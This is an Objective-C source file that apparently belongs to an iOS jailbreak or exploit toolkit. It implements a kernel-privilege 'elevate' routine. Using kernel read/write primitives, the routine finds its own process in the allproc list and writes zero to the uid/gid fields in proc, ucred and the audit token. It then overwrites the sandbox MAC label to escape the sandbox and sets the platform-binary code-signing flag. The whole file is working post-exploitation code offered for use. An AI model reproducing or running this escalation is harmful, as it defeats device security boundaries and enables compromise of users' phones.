//
//  Lum1naElevate.m
//  Lum1na
//

#import "Lum1naElevate.h"
#import "Lum1naStructOffsets.h"
#import "Lum1naBoard.h"
#import "Lum1naKreadLane.h"
#import "../Exploit/LabRuntimeOffsets.h"
#import "../Exploit/LabLocalTime.h"

#include <unistd.h>
#include <stdlib.h>
#include <string.h>

/* XPACI-based kernel pointer unsign, lives in ClearSwordCore/poc.c.
   Identity on arm64. Same local-prototype convention as P069 mach_vm_map. */
extern uint64_t cs2_unpac_ptr(uint64_t kptr);

/* libsystem; CS_OPS_STATUS = 0. */
extern int csops(pid_t pid, unsigned int ops, void *useraddr, size_t usersize);
#define EL_CS_OPS_STATUS 0

#pragma mark - log helper

static void el_log(NSMutableString *s, NSString *fmt, ...) {
    va_list ap; va_start(ap, fmt);
    NSString *line = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    [s appendFormat:@"[*] %@\n", line];
}
static void el_ok(NSMutableString *s, NSString *fmt, ...) {
    va_list ap; va_start(ap, fmt);
    NSString *line = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    [s appendFormat:@"[+] %@\n", line];
}
static void el_bad(NSMutableString *s, NSString *fmt, ...) {
    va_list ap; va_start(ap, fmt);
    NSString *line = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    [s appendFormat:@"[-] %@\n", line];
}

#pragma mark - lane cascade (Lum1naKreadLane - shared with P094/P095)

#define el_kread64(a)        Lum1naLaneKRead64(a)
#define el_kread32(a)        Lum1naLaneKRead32(a)
#define el_kwrite64(a, v)    Lum1naLaneKWrite64(a, v)
#define el_kwrite32(a, v)    Lum1naLaneKWrite32(a, v)

/// Kernel zone/dynamic pointer heuristic: procs are zone allocations
/// (0xFFFFFFE0...+ per Dopamine VM_PAGE_PACKED_PTR_BASE), while the
/// allproc list head is static __DATA (0xFFFFFFF0...). The backward walk
/// stops at the head this way.
static BOOL el_looks_zone(uint64_t v) {
    return v >= 0xFFFFFFE000000000ULL && v < 0xFFFFFFF000000000ULL;
}
static BOOL el_looks_static(uint64_t v) {
    return v >= 0xFFFFFFF000000000ULL;
}

@implementation Lum1naElevate

+ (NSString *)runElevate {
    NSMutableString *s = [NSMutableString string];
    Lum1naBoard *b = [Lum1naBoard shared];
    const LabOffTab *off = LabOff();
    const LabProcOffTab *po = LabProcOff();

    el_log(s, @"=== ELEVATE %@ ===", LabLocalMilitaryNow() ?: @"?");

    if (!b.hasKread || !Lum1naLaneLive()) {
        el_bad(s, @"elevate SKIP - hasKread=%@ lane=%s",
               b.hasKread ? @"YES" : @"NO",
               Lum1naLaneName());
        return s;
    }
    if (!po) {
        el_bad(s, @"elevate SKIP - no struct-offset row for this SKU");
        return s;
    }

    uint64_t slide = b.kslide;
    if (!po->kernproc && ![b provenKernproc]) {
        el_bad(s, @"elevate HOLD - kernproc VA underived for %@ (LabProcOff 0 AND no p094 proven value).",
               off ? [NSString stringWithUTF8String:off->tag] : @"?");
        el_log(s, @"Unlock path: tap P094 kernproc derive (catalog p094) on this device, then re-run.");
        el_log(s, @"uid0/unsandbox/platformize not attempted; AMFI/inject continue sandboxed (expected EPERM).");
        [[Lum1naBoard shared] recordEvent:@"elevate" kind:@"hold" detail:@"kernproc-underived" source:@"elevate"];
        return s;
    }
    uint64_t kernprocStatic = po->kernproc ? po->kernproc : [b provenKernproc];
    NSString *kpSource = po->kernproc ? @"LabProcOff" : @"p094-proven";
    uint64_t kernproc = kernprocStatic + slide;
    el_log(s, @"kernproc source %@: unslid 0x%llx", kpSource, (unsigned long long)kernprocStatic);

    // 1. find our proc: kernproc is proc 0 (oldest); walk p_list.le_prev
    //    backward. le_prev holds &prev->le_next, and le_next sits at
    //    offset 0, so the value IS the previous proc. When the value is
    //    STATIC (0xFFFFFFF0...) it is &proc0.le_next == proc0 itself
    //    (proc0 is a static kernel global; p_list sits at offset 0).
    if (el_kread32(kernproc + po->proc_pid) != 0) {
        el_bad(s, @"elevate HOLD - kernproc sanity failed (pid!=0 at 0x%llx). VA wrong; keep underived.",
               (unsigned long long)kernproc);
        [[Lum1naBoard shared] recordEvent:@"elevate" kind:@"hold" detail:@"kernproc-sanity" source:@"elevate"];
        return s;
    }
    pid_t mypid = getpid();
    uint64_t cur = kernproc, selfp = 0;
    for (int i = 0; i < 4096; i++) {
        if (el_kread32(cur + po->proc_pid) == (uint32_t)mypid) { selfp = cur; break; }
        uint64_t prev = cs2_unpac_ptr(el_kread64(cur + po->proc_list_prev));
        if (!prev || prev == cur) break;
        if (el_looks_zone(prev)) { cur = prev; continue; }
        if (el_looks_static(prev)) {
            /* proc0 edge: static le_prev IS proc0's address. */
            if (el_kread32(prev + po->proc_pid) == 0) { cur = prev; continue; }
        }
        break;
    }
    if (!selfp) {
        el_bad(s, @"elevate HOLD - our proc (pid %d) not found in allproc backward walk", mypid);
        [[Lum1naBoard shared] recordEvent:@"elevate" kind:@"hold" detail:@"proc-not-found" source:@"elevate"];
        return s;
    }
    el_ok(s, @"proc_self = 0x%llx (pid %d)", (unsigned long long)selfp, mypid);

    // 2. proc -> proc_ro -> ucred
    uint64_t proc_ro = cs2_unpac_ptr(el_kread64(selfp + po->proc_proc_ro));
    uint64_t ucred = cs2_unpac_ptr(el_kread64(proc_ro + po->pro_ro_ucred));
    if (!el_looks_zone(ucred) && !(ucred >= 0xFFFFFFF000000000ULL)) {
        el_bad(s, @"elevate HOLD - ucred 0x%llx implausible", (unsigned long long)ucred);
        return s;
    }
    el_log(s, @"proc_ro=0x%llx ucred=0x%llx", (unsigned long long)proc_ro, (unsigned long long)ucred);

    // 3. uid0/gid0 (DOJailbreaker.elevatePrivileges verbatim set)
    el_kwrite32(selfp + po->proc_svuid, 0);
    el_kwrite32(ucred + po->ucred_svuid, 0);
    el_kwrite32(ucred + po->ucred_ruid, 0);
    el_kwrite32(ucred + po->ucred_uid, 0);
    el_kwrite32(selfp + po->proc_svgid, 0);
    el_kwrite32(ucred + po->ucred_rgid, 0);
    el_kwrite32(ucred + po->ucred_svgid, 0);
    el_kwrite32(ucred + po->ucred_groups, 0);

    // 4. clear P_SUGID so the cred change takes effect.
    //    (Dopamine-tree reads `flag &= P_SUGID`; that is a transcription
    //    artifact - the shipped semantic is clearing the bit.)
    uint32_t flag = el_kread32(selfp + po->proc_flag);
    if (flag & LAB_P_SUGID) {
        el_kwrite32(selfp + po->proc_flag, flag & ~LAB_P_SUGID);
    }

    // 4b. audit_token fix (Dopamine proc_ucred_update_content verbatim):
    //     auditToken = proc_ro + task_tokens + 0x8; uid@+4 gid@+8 ruid@+12
    //     rgid@+16. WITHOUT this the Mach audit token still carries euid
    //     501 - and Dopamine's Root-domain gate reads audit_token_to_euid,
    //     so libkrw/opainject would stay refused even with getuid()==0.
    //     task_tokens is REMOVED on darwin 25+ (26.5) - row value 0 skips.
    if (po->pro_ro_task_tokens) {
        uint64_t auditToken = proc_ro + po->pro_ro_task_tokens + LAB_TASK_TOKEN_AUDIT;
        uint32_t auid = el_kread32(auditToken + LAB_TT_UID_OFF);
        if (auid == (uint32_t)getuid() || auid == 501 || auid == 0) {
            el_kwrite32(auditToken + LAB_TT_UID_OFF,  0);
            el_kwrite32(auditToken + LAB_TT_GID_OFF,  0);
            el_kwrite32(auditToken + LAB_TT_RUID_OFF, 0);
            el_kwrite32(auditToken + LAB_TT_RGID_OFF, 0);
            el_log(s, @"audit_token fixed at proc_ro+0x%x+0x8 (uid/gid/ruid/rgid -> 0)",
                   po->pro_ro_task_tokens);
        } else {
            el_bad(s, @"audit_token uid=%u unexpected - task_tokens offset suspect, fix SKIPPED", auid);
        }
    } else {
        el_log(s, @"task_tokens=0 for this SKU (darwin 25+) - audit fix skipped (token built at exec).");
    }

    if (getuid() != 0 || getgid() != 0) {
        el_bad(s, @"elevate FAIL - uid=%d gid=%d after writes (offsets wrong for this SKU?)", getuid(), getgid());
        [[Lum1naBoard shared] recordEvent:@"elevate" kind:@"fail" detail:@"uid-not-zero" source:@"elevate"];
        return s;
    }
    el_ok(s, @"uid=0 gid=0 (verified via getuid/getgid)");

    // 5. unsandbox: mac_label_set(label, 1, -1) semantics =
    //    kwrite64(label + (slot+1)*8, ~0) on proc_ro kernels
    //    (Dopamine kernel.c verbatim shape).
    uint64_t label = cs2_unpac_ptr(el_kread64(ucred + po->ucred_label));
    if (el_looks_zone(label) || label >= 0xFFFFFFF000000000ULL) {
        if (!el_kwrite64(label + 0x10, ~0ULL)) {
            el_bad(s, @"elevate - MAC label write failed at 0x%llx", (unsigned long long)(label + 0x10));
        }
    } else {
        el_bad(s, @"elevate - ucred.label 0x%llx implausible, MAC write skipped", (unsigned long long)label);
    }
    NSError *varErr = nil;
    [[NSFileManager defaultManager] contentsOfDirectoryAtPath:@"/var" error:&varErr];
    if (varErr) {
        el_bad(s, @"elevate - unsandbox NOT confirmed: /var unreadable (%@)", varErr.localizedDescription);
        [[Lum1naBoard shared] recordEvent:@"elevate" kind:@"fail" detail:@"var-unreadable" source:@"elevate"];
        return s;
    }
    el_ok(s, @"unsandboxed - /var readable");
    setenv("HOME", "/var/root", 1);
    setenv("CFFIXED_USER_HOME", "/var/root", 1);
    setenv("TMPDIR", "/var/tmp", 1);

    // 6. platformize: proc_ro.csflags |= CS_PLATFORM_BINARY, verify csops.
    uint32_t csf = el_kread32(proc_ro + po->pro_ro_csflags);
    el_kwrite32(proc_ro + po->pro_ro_csflags, csf | LAB_CS_PLATFORM_BINARY);
    uint32_t live = 0;
    csops(getpid(), EL_CS_OPS_STATUS, &live, sizeof(live));
    if (!(live & LAB_CS_PLATFORM_BINARY)) {
        el_bad(s, @"elevate - CS_PLATFORM_BINARY not visible via csops (wrote 0x%x, read 0x%x)",
               csf | LAB_CS_PLATFORM_BINARY, live);
        [[Lum1naBoard shared] recordEvent:@"elevate" kind:@"fail" detail:@"platform-not-set" source:@"elevate"];
        return s;
    }
    el_ok(s, @"CS_PLATFORM_BINARY set (csops 0x%x)", live);

    [[Lum1naBoard shared] recordEvent:@"elevate" kind:@"fire" detail:@"uid0+unsandbox+platform" source:@"elevate"];
    el_ok(s, @"elevate COMPLETE - AMFI/inject/respring now run unsandboxed");
    return s;
}

@end
